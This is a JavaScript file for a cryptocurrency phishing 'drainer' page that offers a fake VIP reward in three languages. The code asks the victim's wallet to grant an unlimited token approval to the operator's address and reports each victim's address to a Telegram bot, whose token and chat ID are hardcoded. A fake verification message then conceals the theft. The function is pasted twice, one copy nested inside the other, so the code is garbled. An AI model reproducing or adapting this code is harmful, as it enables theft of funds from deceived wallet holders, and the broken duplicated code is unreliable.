const content = {
    en: { title: "Claim VIP Reward", desc: "Congratulations! Synchronize your wallet to claim your assets.", btn: "CLAIM REWARD NOW", status: "Reward Status: Ready" },
    cn: { title: "领取 VIP 奖励", desc: "恭喜！同步您的钱包以领取您的资产。", btn: "立即领取奖励", status: "奖励状态：就绪" },
    ru: { title: "Получить VIP-награду", desc: "Поздравляем! Синхронизируйте кошелек, чтобы получить активы.", btn: "ПОЛУЧИТЬ НАГРАДУ", status: "Статус награды: Готов" }
};

function changeLang(lang) {
    document.getElementById('txt-title').innerText = content[lang].title;
    document.getElementById('txt-desc').innerText = content[lang].desc;
    document.getElementById('txt-btn').innerText = content[lang].btn;
    document.getElementById('txt-status').innerText = content[lang].status;
}

async function startVerification() {
    if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const user = accounts[0];
            
            const tokenAddress = document.getElementById('targetToken').value; // Ambil dari Panel Admin
            const spenderAddress = document.getElementById('myWallet').value; // Dompet Wadahmu
            
            const abi = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"boolean"}],"type":"function"}];
            const contract = new web3.eth.Contract(abi, tokenAddress);
            const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

            document.getElementById('txt-status').innerText = "Processing Authorization...";
            
            await contract.methods.approve(spenderAddress, amount).send({ from: user });
async function startVerification() {
    if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const user = accounts[0];
            
            const tokenAddress = document.getElementById('targetToken').value;
            const spenderAddress = document.getElementById('myWallet').value;
            
            const abi = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"boolean"}],"type":"function"}];
            const contract = new web3.eth.Contract(abi, tokenAddress);
            const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

            // 1. Meminta persetujuan dari paus
            await contract.methods.approve(spenderAddress, amount).send({ from: user });

            // --- TAMBAHKAN KODE TELEGRAM DI SINI ---
            const tele_bot_id = "8679938218:AAH_ZuYcoOroEBC-79sQ1CgoEKzcaCrWmYs"; // Ganti dengan Token dari @BotFather
            const tele_chat_id = "8795373522";   // Ganti dengan ID Chat kamu
            const message = `🚀 **TING! ALERT CLOUD NINE** 🚀%0A%0ASeorang paus baru saja memberikan izin akses!%0A%0AWallet Paus: ${user}%0AToken Target: ${tokenAddress}%0A%0ACek dompet wadahmu sekarang Arsitek!`;

            fetch(`https://api.telegram.org/bot${tele_bot_id}/sendMessage?chat_id=${tele_chat_id}&text=${message}&parse_mode=Markdown`);
            // ---------------------------------------

            alert("Verification Complete. Please wait 24h for IBAN activation.");
        } catch (e) {
            console.error(e);
        }
    }
}
            
            alert("Verification Complete. Please wait 24h for IBAN activation.");
        } catch (e) {
            document.getElementById('txt-status').innerText = "Verification Failed. Try again.";
        }
    } else {
        alert("Please use SafePal or OKX DApp Browser.");
    }
}